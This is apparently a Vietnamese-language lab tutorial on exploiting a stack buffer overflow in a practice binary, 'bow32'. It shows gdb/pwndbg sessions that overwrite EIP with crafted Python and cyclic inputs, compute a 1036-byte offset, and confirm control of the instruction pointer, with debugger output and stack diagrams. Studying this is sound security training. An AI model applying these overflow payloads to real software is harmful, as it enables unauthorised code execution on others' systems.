# Take Control of EIP
---
## Lỗi phân đoạn - Segmentation Fault
```shell
└─$ gdb -q bow32    <--- into the gdb debug

pwndbg> run $(python2 -c "print('\x55' * 1200)")
Starting program: /.../Linux_x86/Exploxit/Attack/bow32 $(python2 -c "print('\x55' * 1200)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()

```

Nếu cho 1200 ký tự "\x55" làm đầu vào chúng ta có thể thấy thông tin thanh ghi EIP đã bị ghi đè. Theo những gì chúng tôi biết, EIP trỏ đến lệnh tiếp theo sẽ được thực thi.

```shell
pwndbg> info register
eax            0x1                 1
ecx            0xffffd190          -11888
edx            0xffffcaf1          -13583
ebx            0x55555555          1431655765
esp            0xffffca60          0xffffca60
ebp            0x55555555          0x55555555
esi            0x56558eec          1448447724
edi            0xf7ffcba0          -134231136
eip            0x55555555          0x55555555 # <---- thanh ghi con trỏ lệnh EIP đã bị ghi đè
eflags         0x10286             [ PF SF IF RF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
....
```
Mô tả trực quan hình ảnh dữ liệu:
```shell
| Address | Stack  |                                DATA
|:-------:|:------:|                                 ⬇
| Low     | ...... | <--- ESP
|         | Data   |                                 
|         | Data   |                                  
|         | Data   |                                  
|         | ....   | 
|         | Data   | 
|         | Data   | <--- EBP        
|         | Data   |                  
|         | Data   | <--- EPI                
| High    | ...... |         
```
Điều này có nghĩa là chúng ta phải ghi quyền truy cập vào EIP. Điều này cho phép chỉ định địa chỉ bộ nhớ mà EIP sẽ nhảy tới. Tuy nhiên, để thao tác với thanh ghi, chúng ta cần một số U chính xác cho đến EIP để 4 byte sau có thể được ghi đè bằng địa chỉ bộ nhớ mong muốn của chúng ta.

## Tìm offset 
* Offset là phần dữ liệu xác định để ghi đè **Buffer**.

* Shellcode là mã chương trình chứa các hướng dẫn cho một thao tác mà chúng ta muốn CPU thực hiện

### Attack
Tạo Payload
```shell
└─$ cyclic 1200 > input
# Tạo payload có độ dài 1200 byte ghi vào file input
```
Attack
```shell
pwndbg> run $(cat input)
Starting program: /.../Linux_x86/Exploxit/Attack/bow32 $(cat input)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x6b61616a in ?? ()

---

pwndbg> info register
    ...
    eip            0x6b61616a          0x6b61616a
    ...
```
Chúng ta cần tính toán **offset**

```shell
└─$ cyclic -l jaak # 0x6b61616a - little endian
1036
```

```shell
| Address |     Stack    |                                DATA
|:-------:|:------------:|                                 ⬇
| Low     | ............ | <--- ESP
|         |     Data     |              <-*
|         |     Data     |                *
|         |     Data     |                *   # 1036 byte offset           
|         |     Data     | <--- EBP       *  
|         |              |              <-*    
|         |  0x6b61616a  | <--- EPI                
| High    | ............ |         
```

**CHECKEND**
```shell
pwndbg> run $(python2 -c "print('a' * 1036 + '\x66' * 4)")
Starting program: /.../Linux_x86/Exploxit/Attack/bow32 $(python2 -c "print('a' * 1036 + '\x66' * 4)")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```




